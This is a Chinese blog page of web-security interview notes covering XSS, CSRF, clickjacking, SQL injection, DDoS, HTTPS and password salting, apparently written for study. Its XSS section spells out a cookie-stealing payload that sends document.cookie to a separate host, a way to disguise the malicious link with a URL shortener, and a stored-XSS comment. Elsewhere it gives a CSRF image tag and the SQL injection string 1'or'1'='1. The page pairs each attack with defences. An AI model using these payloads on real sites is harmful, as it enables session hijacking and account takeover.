<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>网络安全 | xx的博客</title>
    <meta name="generator" content="VuePress 1.5.0">
    <link rel="icon" href="./2.jpg">
    <meta name="description" content="Welcome">
    <link rel="preload" href="/assets/css/0.styles.8b57ca07.css" as="style"><link rel="preload" href="/assets/js/app.b7abec6d.js" as="script"><link rel="preload" href="/assets/js/2.abe78d93.js" as="script"><link rel="preload" href="/assets/js/24.2cb8cadf.js" as="script"><link rel="preload" href="/assets/js/5.f990928a.js" as="script"><link rel="prefetch" href="/assets/js/10.9cf6598d.js"><link rel="prefetch" href="/assets/js/11.df34b82f.js"><link rel="prefetch" href="/assets/js/12.7fb2abf1.js"><link rel="prefetch" href="/assets/js/13.d1e87d6e.js"><link rel="prefetch" href="/assets/js/14.cd14ebb0.js"><link rel="prefetch" href="/assets/js/15.c890b1b1.js"><link rel="prefetch" href="/assets/js/16.8bda8f59.js"><link rel="prefetch" href="/assets/js/17.271cb451.js"><link rel="prefetch" href="/assets/js/18.a8bc42d5.js"><link rel="prefetch" href="/assets/js/19.865cf1bf.js"><link rel="prefetch" href="/assets/js/20.f61f8be2.js"><link rel="prefetch" href="/assets/js/21.ec8aee77.js"><link rel="prefetch" href="/assets/js/22.d64a6ba2.js"><link rel="prefetch" href="/assets/js/23.2fe942e0.js"><link rel="prefetch" href="/assets/js/25.e14bc8c3.js"><link rel="prefetch" href="/assets/js/26.9216a8e7.js"><link rel="prefetch" href="/assets/js/3.3faae2d7.js"><link rel="prefetch" href="/assets/js/4.be82c51c.js"><link rel="prefetch" href="/assets/js/6.d1da093d.js"><link rel="prefetch" href="/assets/js/7.59fc17b1.js"><link rel="prefetch" href="/assets/js/8.220bb62b.js"><link rel="prefetch" href="/assets/js/9.28a30f0e.js">
    <link rel="stylesheet" href="/assets/css/0.styles.8b57ca07.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">xx的博客</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">
  首页
</a></div><div class="nav-item"><a href="/reading/" class="nav-link">
  最近阅读
</a></div><div class="nav-item"><a href="/test/" class="nav-link router-link-active">
  面试题
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  关于我
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="联系方式" class="dropdown-title"><span class="title">联系方式</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/ins/" class="nav-link">
  Ins
</a></li><li class="dropdown-item"><!----> <a href="/wechat/" class="nav-link">
  微信
</a></li><li class="dropdown-item"><!----> <a href="https://gitee.com/xuxin2019f" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Gittee
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://github.com/xuxin2019-f" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">
  首页
</a></div><div class="nav-item"><a href="/reading/" class="nav-link">
  最近阅读
</a></div><div class="nav-item"><a href="/test/" class="nav-link router-link-active">
  面试题
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  关于我
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="联系方式" class="dropdown-title"><span class="title">联系方式</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/ins/" class="nav-link">
  Ins
</a></li><li class="dropdown-item"><!----> <a href="/wechat/" class="nav-link">
  微信
</a></li><li class="dropdown-item"><!----> <a href="https://gitee.com/xuxin2019f" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Gittee
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://github.com/xuxin2019-f" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/test/" aria-current="page" class="sidebar-link">CSS 相关</a></li><li><a href="/test/aboutHtml.html" class="sidebar-link">HTML 相关</a></li><li><a href="/test/aboutjs.html" class="sidebar-link">js 相关</a></li><li><a href="/test/web.html" class="sidebar-link">浏览器</a></li><li><a href="/test/webpack.html" class="sidebar-link">webpack</a></li><li><a href="/test/safety.html" aria-current="page" class="active sidebar-link">网络安全</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/test/safety.html#_1-xss-攻击（直接盗取用户登录状态）" class="sidebar-link">1.XSS 攻击（直接盗取用户登录状态）</a></li><li class="sidebar-sub-header"><a href="/test/safety.html#_2-csrf（cross-site-request-forgery）（只是利用用户登录状态）" class="sidebar-link">2.CSRF（Cross-site Request forgery）（只是利用用户登录状态）</a></li><li class="sidebar-sub-header"><a href="/test/safety.html#_3-点击劫持-clickjacking" class="sidebar-link">3.点击劫持-clickjacking</a></li><li class="sidebar-sub-header"><a href="/test/safety.html#_4-sql-注入" class="sidebar-link">4.SQL 注入</a></li><li class="sidebar-sub-header"><a href="/test/safety.html#其他攻击手段" class="sidebar-link">其他攻击手段</a></li><li class="sidebar-sub-header"><a href="/test/safety.html#_5-http-危害" class="sidebar-link">5.HTTP 危害</a></li><li class="sidebar-sub-header"><a href="/test/safety.html#防御手段-3" class="sidebar-link">防御手段</a></li></ul></li><li><a href="/test/aboutVue.html" class="sidebar-link">Vue 相关</a></li><li><a href="/test/aboutReact.html" class="sidebar-link">React 相关</a></li><li><a href="/test/math.html" class="sidebar-link">算法相关</a></li><li><a href="/test/git.html" class="sidebar-link">git 相关</a></li><li><a href="/test/aboutTs.html" class="sidebar-link">关于 TS</a></li><li><a href="/test/test.html" class="sidebar-link">总结的面试题</a></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="网络安全"><a href="#网络安全" class="header-anchor">#</a> 网络安全</h1> <h2 id="_1-xss-攻击（直接盗取用户登录状态）"><a href="#_1-xss-攻击（直接盗取用户登录状态）" class="header-anchor">#</a> 1.XSS 攻击（直接盗取用户登录状态）</h2> <p>Cross Site Scripting</p> <p>通过在有安全漏洞的 web 网站上的 url 后输入非法的非本站点的 HTML 标签或是 JavaScript 进行的一种攻击</p> <h3 id="xss-攻击分类"><a href="#xss-攻击分类" class="header-anchor">#</a> XSS 攻击分类</h3> <p>1.反射型-url 参数直接注入</p> <div class="language-js extra-class"><pre class="language-js"><code>普通，网页会渲染<span class="token keyword">from</span>后的内容
http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token operator">:</span><span class="token number">3000</span><span class="token operator">/</span><span class="token operator">?</span><span class="token keyword">from</span><span class="token operator">=</span>china

黑客先尝试是否能alert尝试
http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token operator">:</span><span class="token number">3000</span><span class="token operator">/</span><span class="token operator">?</span><span class="token keyword">from</span><span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
如果成功了，则开始输入非法脚本

<span class="token comment">//获取Cookie</span>
http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token operator">:</span><span class="token number">3000</span><span class="token operator">/</span><span class="token operator">?</span><span class="token keyword">from</span><span class="token operator">=</span><span class="token operator">&lt;</span>scriptsrc<span class="token operator">=</span><span class="token string">&quot;http://localhost:4000/hack.js&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>

其中在<span class="token number">4000</span>端口的hack<span class="token punctuation">.</span>js内容为：用img<span class="token punctuation">.</span>src获取异步请求
<span class="token keyword">var</span> img <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://localhost:4000/img?c='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie

然后在<span class="token number">4000</span>端口后台操作获取<span class="token number">3000</span>端口的cookie值，此后，在登录<span class="token number">3000</span>端口网站时，我们直接可以通过获取到的cookie模仿此人登录来进行操作了
直接在后台输入cookie来伪造cookie入侵chrome
document<span class="token punctuation">.</span>cookie<span class="token operator">=</span><span class="token string">&quot;kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0=&quot;</span>
登陆成功
</code></pre></div><p><strong>如何触发</strong></p> <p>比如通过百度短网址的缩短网址功能https://dwz.cn/</p> <p>将</p> <div class="language- extra-class"><pre class="language-text"><code>http://localhost:3000/?from=&lt;scriptsrc=&quot;http://localhost:4000/hack.js&quot;&gt;&lt;/script&gt;
</code></pre></div><p><strong>缩短成一个看似正常的网址，如果用户点击进去了，又登录了，则会被黑客窃取登录信息</strong></p> <p>2.存储型-存储到数据库中</p> <p>比如在某个评论区先实验是否可以输出 script 脚本：</p> <div class="language- extra-class"><pre class="language-text"><code>//评论&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre></div><p>发现成功弹框了，则开始评论带有非法非本站点的脚本</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//跨站脚本注入</span>
我来了<span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">&quot;http://localhost:4000/hack.js&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre></div><p>此时评论区显示我来了三个字样，并加载了这个脚本，并且已经存入数据库，<strong>这会导致所有登陆后访问这个评论页面的用户信息都会被 4000 端口窃取</strong></p> <h3 id="xss-防止攻击方法"><a href="#xss-防止攻击方法" class="header-anchor">#</a> XSS 防止攻击方法</h3> <p>1.ejs 转义</p> <p>ejs 是一套简单的模板语言，利用普通的 js 代码生成 html 页面</p> <p>使用见https://www.jianshu.com/p/6ed2f9fb6197</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;%code%&gt;用于执行其中javascript代码；
&lt;%=code%&gt;会对code进行html转义；用这条来防止XSS攻击，会把script标签直接显示出来
&lt;%-code%&gt;将不会进行转义
</code></pre></div><p>2.HEAD 设置 X-XSS-Protextion:1 启用 XSS 过滤</p> <div class="language- extra-class"><pre class="language-text"><code>ctx.set('X-XSS-Protection',1)
</code></pre></div><p>3.CSP（也是 ctx.set)</p> <p>CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。</p> <div class="language- extra-class"><pre class="language-text"><code>//只允许加载本站资源
Content-Security-Policy:default-src'self'
//只允许加载HTTPS协议图片
Content-Security-Policy:img-srchttps://*
//不允许加载任何来源框架
Content-Security-Policy:child-src'none'
</code></pre></div><p>4.转义字符</p> <p>原理是将引号、尖括号、斜杠进行转义，使 script 标签无法生效</p> <ul><li>黑名单：</li></ul> <div class="language- extra-class"><pre class="language-text"><code>function escape(str) {
	str = str.replace(/&amp;/g, &quot;&amp;amp;&quot;);
	str = str.replace(/&lt;/g, &quot;&amp;lt;&quot;);
	str = str.replace(/&gt;/g, &quot;&amp;gt;&quot;);
	str = str.replace(/&quot;/g, &quot;&amp;quto;&quot;);
	str = str.replace(/'/g, &quot;&amp;##39;&quot;);
	str = str.replace(/`/g, &quot;&amp;##96;&quot;);
    str = str.replace(/\//g, &quot;&amp;##x2F;&quot;);
    return str
}
</code></pre></div><ul><li>白名单</li></ul> <p>对于显示富文本来说，不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。这种情况通常采用白名单过滤的办法。引入 xss 白名单库</p> <div class="language- extra-class"><pre class="language-text"><code>var xss = require(&quot;xss&quot;);
var html = xss('&lt;h1 id=&quot;title&quot;&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;');
// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&amp;lt;script&amp;gt;alert(&quot;xss&quot;);&amp;lt;/script&amp;gt;
console.log(html);
</code></pre></div><p>5.设置 HttpOnly Cookie</p> <p>这是预防 XSS 攻击窃取用户 cookie 最有效的防御手段。Web 应用程序在设置 cookie 时，将其属性设为 HttpOnly，就可以避免该网页的 cookie 被客户端恶意 JavaScript 窃取，保护用户 cookie 信息。</p> <h2 id="_2-csrf（cross-site-request-forgery）（只是利用用户登录状态）"><a href="#_2-csrf（cross-site-request-forgery）（只是利用用户登录状态）" class="header-anchor">#</a> 2.CSRF（Cross-site Request forgery）（只是利用用户登录状态）</h2> <p>是一种挟制用户在当前已登录的<code>Web</code>应用程序上执行非本意的操作的攻击方法，<code>CSRF</code> 就是利用用户的登录态发起恶意请求</p> <p><strong>如何触发：</strong></p> <p>用户已经登录了 A 网站，并在本地记录了 cookie，<strong>那么在用户没有退出销毁 cookie 的情况下</strong>，意外访问了恶意网站 B，B 网站会有一个要求访问站点 A 的操作，这个时候 A 站点如果没有做任何的 CSRF 防御，则会被恶意攻击</p> <p>比如假设网站中有一个通过 Get 请求提交用户评论的接口，那么攻击者就可以在钓鱼网站中加入一个图片，图片的地址就是评论接口</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;img src=&quot;http://www.domain.com/xxx?comment='attack'&quot;/&gt;
</code></pre></div><h3 id="防御手段"><a href="#防御手段" class="header-anchor">#</a> 防御手段</h3> <p>1.阻止第三方网站访问到用户 cookie</p> <p>2.阻止第三方网站请求接口</p> <p><strong>3.请求时附带验证信息 TOKEN、手机验证码、图片验证码（这些验证码设置一定是在后端的，否则不安全）等</strong></p> <p>TOKEN 防止 SCRF 攻击：</p> <p>https://blog.csdn.net/weixin_30677617/article/details/101518465</p> <p>4.cookie 值进行 hash：攻击者在访问信任网站 A 时，虽然浏览器可以在请求中带上 cookie，但是网站 A 却不仅仅通过 cookie 来判断用户身份，还要通过发来的伪随机数来判断请求是否真的是用户发送的</p> <h2 id="_3-点击劫持-clickjacking"><a href="#_3-点击劫持-clickjacking" class="header-anchor">#</a> 3.点击劫持-clickjacking</h2> <p><strong>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。</strong></p> <p>比如我们登陆了 3000 端口的 A 网站后，意外的登陆了 4000 端口的恶意网站http://localhost:4000/clickjacking.html，在4000端口设置了一个iframe，其中嵌套着3000端口的内容，比如是一个评论区，并将这个iframe透明度设置为0，在4000端口设置的网页中有一个按钮和3000端口的评论按钮实际上重合，点击这个恶意网站的按钮，实际上进行了在3000端口评论的恶意操作。</p> <h3 id="防御手段-2"><a href="#防御手段-2" class="header-anchor">#</a> 防御手段</h3> <p>1.后端设置 X-FRAME-OPTIONS 报头</p> <p>该响应头有三个值可选，分别是
<strong>DENY，表示页面不允许通过 iframe 的方式展示</strong></p> <p>SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示</p> <p>ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示</p> <div class="language- extra-class"><pre class="language-text"><code>ctx.set('X-FRAME-OPTIONS','DENY')
</code></pre></div><p>2.JS 方式</p> <h2 id="_4-sql-注入"><a href="#_4-sql-注入" class="header-anchor">#</a> 4.SQL 注入</h2> <p><strong>针对的是数据库</strong></p> <p>比如在需要填入用户名和密码的表单中，黑客不知道密码，在填入用户名后，密码写成：1'or'1'='1 的形式，那么在后端拼接后的 SQL 将会是：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//拼接后的SQL</span>
<span class="token constant">SELECT</span><span class="token operator">*</span>
FROMtest<span class="token punctuation">.</span>user
<span class="token constant">WHERE</span> username<span class="token operator">=</span><span class="token string">'laowang'</span>
<span class="token constant">AND</span> password<span class="token operator">=</span><span class="token string">'1'</span>or<span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span>

使password后的<span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>变成一个永真，这样永远都可以登录成功
</code></pre></div><h3 id="防御方式"><a href="#防御方式" class="header-anchor">#</a> 防御方式</h3> <p>所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query 方法中的?占位参数。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//错误写法</span>
<span class="token keyword">const</span> sql<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
SELECT*
FROMtest.user
WHERE username='</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">'
AND password='</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">'
</span><span class="token template-punctuation string">`</span></span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'sql'</span><span class="token punctuation">,</span>sql<span class="token punctuation">)</span>
res<span class="token operator">=</span><span class="token function">awaitquery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span>

<span class="token comment">//正确的写法</span>
<span class="token keyword">const</span> sql<span class="token operator">=</span>`<span class="token constant">SELECT</span><span class="token operator">*</span>
<span class="token constant">FROM</span> test<span class="token punctuation">.</span>user
<span class="token constant">WHERE</span> username<span class="token operator">=</span><span class="token operator">?</span>
<span class="token constant">AND</span> password<span class="token operator">=</span><span class="token operator">?</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'sql'</span><span class="token punctuation">,</span>sql<span class="token punctuation">,</span><span class="token punctuation">)</span>
res<span class="token operator">=</span><span class="token function">awaitquery</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token punctuation">[</span>ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre></div><h2 id="其他攻击手段"><a href="#其他攻击手段" class="header-anchor">#</a> 其他攻击手段</h2> <p>OS 注入：针对的是操作系统</p> <p>请求劫持：</p> <ul><li>DNS 劫持，即修改了域名解析的结果，使得访问到的不是预期的 ip</li> <li>HTTP 劫持，此时只能升级 https</li></ul> <p>DDOS：</p> <p>是一大类攻击的总称，对网站的任何环节都可以进行攻击，只要其中一个环节攻破，整个流程就会瘫痪</p> <ul><li>SYN Flood</li></ul> <p>此攻击通过向目标发送具有欺骗性源 IP 地址的大量 TCP“初始连接请求”SYN 数据包来利用 TCP 握手。目标机器响应每个连接请求，然后等待握手中的最后一步，这一步从未发生过，耗尽了进程中的目标资源。</p> <ul><li>HTTP Flood</li></ul> <p>此攻击类似于同时在多个不同计算机上反复按 Web 浏览器中的刷新-大量 HTTP 请求泛滥服务器，导致拒绝服务。</p> <p>防御：备份网站，用靠谱的运营商，带宽扩容</p> <h2 id="_5-http-危害"><a href="#_5-http-危害" class="header-anchor">#</a> 5.HTTP 危害</h2> <p>HTTP 是明文传输的，且要经历许多服务器，可能会在传输过程中遭到窃取（密码、敏感信息）篡改（重定向到别的网站）</p> <p>趋势：转向 HTTPS 加密</p> <h4 id="https"><a href="#https" class="header-anchor">#</a> HTTPS</h4> <p><strong>=HTTP+SSL 证书</strong></p> <p>SSL 证书由浏览器中“受信任的根证书颁发机构”在验证服务器身份后颁发,具有网站身份验证和加密传输双重功能，<strong>使用的是非对称加密技术。</strong></p> <p><strong>什么是对称加密（应用场景如银行的 DES)：</strong></p> <p>所谓对称加密是指双方传递信息时，A 传递的信息通过秘钥进行加密，B 通过相同的秘钥来进行解密，缺点是：如果秘钥泄露，则信息就会被泄露。所以通常的做法是<strong>使用非对称加密</strong></p> <p><strong>什么是非对称加密：</strong></p> <p>产生一对秘钥，其中<strong>公钥负责加密，私钥负责解密</strong>，如果私钥无法解开说明公钥无效（抗抵赖），上述过程是通过复杂算法实现的</p> <h4 id="git-中的两种传输方式（重要）"><a href="#git-中的两种传输方式（重要）" class="header-anchor">#</a> git 中的两种传输方式（重要）</h4> <p>clone 中的两个选项：SSH 和 HTTPS 方式，其中 SSH 需要用到公钥和私钥</p> <h5 id="ssh-公钥登录原理：（使用非对称秘钥）"><a href="#ssh-公钥登录原理：（使用非对称秘钥）" class="header-anchor">#</a> <strong>SSH 公钥登录原理：（使用非对称秘钥）</strong></h5> <p>主要是为了解决每次登录服务器都要输入密码的问题，主要流程为</p> <p>客户端生成公钥和秘钥，将公钥存放在服务端，客户端请求连接服务端时，服务端将一个由公钥加密的随机字符串发送给客户端，客户端通过私钥解密后，将结果发送给服务端，服务端进行比对，如果成功，则同意登录</p> <h5 id="https-验证过程：（最后客户端和服务端的通讯是对称秘钥）"><a href="#https-验证过程：（最后客户端和服务端的通讯是对称秘钥）" class="header-anchor">#</a> <strong>HTTPS 验证过程：（最后客户端和服务端的通讯是对称秘钥）</strong></h5> <ul><li>首先<strong>服务端</strong>生成公钥和私钥，<strong>将公钥发送给 CA 证书中心</strong>，<strong>申请数字证书</strong></li> <li>CA 审核成功，给服务端下发数字证书</li> <li>TCP 三次握手，客户端发送 HTTPS 证书请求，<strong>服务端发送公钥和证书</strong></li> <li>客户端<strong>向 CA 证书中心询问</strong>该证书是否有效（<strong>即验证服务端的身份</strong>）</li> <li>CA 中心返回客户端验证结果</li> <li>客户端自动生成一组<strong>对称秘钥（用该秘钥加密要发送的 URL 链接申请）</strong>，<strong>并用得到的公钥加密这组对称秘钥，发送加密的秘钥和加密的 URL 链接</strong></li> <li>服务端<strong>用私钥解密，得到对称秘钥</strong>，再用该对称秘钥解密 URL 链接</li> <li>服务端通过 URL 取得网页，并用客户端发送来的对称秘钥把该网页加密后发给客户端</li> <li>客户端用自身的对称秘钥解密，获得网页内容</li> <li>TCP 四次挥手</li></ul> <h2 id="防御手段-3"><a href="#防御手段-3" class="header-anchor">#</a> 防御手段</h2> <h3 id="_1-密码安全"><a href="#_1-密码安全" class="header-anchor">#</a> 1.密码安全</h3> <p>泄露渠道：</p> <ul><li>数据库被偷、</li> <li>服务器被监听、</li> <li>即使用了 md5 或是 sha1 加密，但是由于密码过于简单，结果可预制的<strong>彩虹表</strong>（明文和密文对应的表，比如 cmd5.com）攻击来反推出来</li></ul> <p><strong>解决代码见 pdf</strong></p> <p>思考：</p> <ul><li><p>两次 md5 是否可取：不可取，对于简单密码，两次 md5 还是相同的套路，反推所需要的数据量还是相同的，还是可以通过彩虹表反推</p></li> <li><p>只加盐，不加中间字段好不好：</p></li></ul> <div class="language- extra-class"><pre class="language-text"><code>md5(salt+'abced@#4@%#$7'+password)
改为
md5(salt+password)
</code></pre></div><p>不好，因为盐也是存放在数据库中的，而中间字段是存放在程序中的，如果数据库泄露，盐也会泄露，则造成规则的泄露，如果加了中间字段，不容易泄露规则</p> <ul><li>中间字符作用：如上所示，是增加密码复杂度，避免数据库泄露盐泄露就会泄露密码</li> <li>盐泄露是否会泄露密码：如果有中间字段，则不会泄露</li> <li>密码很复杂还需要保证密码的复杂性吗（即+盐和密码字段等）：要，为了防止数据库和程序的泄露</li> <li>浏览器的表单密码在传输给后台时就 md5 或 sha1 加密有必要吗：有，可以增加犯罪成本，防止在传输过程中以明文传输时被破解</li></ul> <h3 id="_2-人机验证和验证码"><a href="#_2-人机验证和验证码" class="header-anchor">#</a> 2.人机验证和验证码</h3> <p><a href="https://www.lisa33xiaoq.net/1232.html" target="_blank" rel="noopener noreferrer">滑动验证码原理<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>滑动验证码实现原理：</p> <ul><li>服务端随机生成抠图和带有抠图阴影的背景图片，服务端保存位置坐标</li> <li>前端实现滑动交互（人机验证），将抠图拼在抠图阴影上，获取到用户滑动距离值</li> <li>前端将用户滑动距离值传入服务端，服务端校验误差是否在容许范围内</li> <li>这个过程中还存在风控服务器，处理风险：滑动行为（滑动时间是否过快不合理？判断为非人为操作）；页面行为（页面都没打开就已经滑动成功？判断为非人为操作）</li></ul> <div class="gitalk-container"><div id="gitalk-container"></div></div> <div class="gitalk-container"><div id="gitalk-container"></div></div> <div class="gitalk-container"><div id="gitalk-container"></div></div> <div class="gitalk-container"><div id="gitalk-container"></div></div> <div class="gitalk-container"><div id="gitalk-container"></div></div> <div class="gitalk-container"><div id="gitalk-container"></div></div> <div class="gitalk-container"><div id="gitalk-container"></div></div> <div class="gitalk-container"><div id="gitalk-container"></div></div> <div class="gitalk-container"><div id="gitalk-container"></div></div> <div class="gitalk-container"><div id="gitalk-container"></div></div> <div class="gitalk-container"><div id="gitalk-container"></div></div></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/test/webpack.html" class="prev">
        webpack
      </a></span> <span class="next"><a href="/test/aboutVue.html">
        Vue 相关
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.b7abec6d.js" defer></script><script src="/assets/js/2.abe78d93.js" defer></script><script src="/assets/js/24.2cb8cadf.js" defer></script><script src="/assets/js/5.f990928a.js" defer></script>
  </body>
</html>
